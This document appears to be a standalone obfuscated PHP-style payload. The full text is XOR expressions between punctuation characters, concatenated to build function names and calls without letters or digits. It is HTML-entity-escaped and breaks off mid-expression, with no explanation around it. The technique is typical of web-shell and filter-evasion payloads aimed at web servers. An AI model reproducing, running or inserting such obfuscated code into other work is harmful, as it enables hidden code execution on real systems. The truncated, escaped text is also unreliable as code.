[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))))([((\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;))((\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))))),((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;))((\u0026#39;(\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))),(\u0026#39;(\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))),(\u0026#39;(\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))),((\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;))((\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))))]),[(\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))])?(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;))(((\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))))((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))),((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026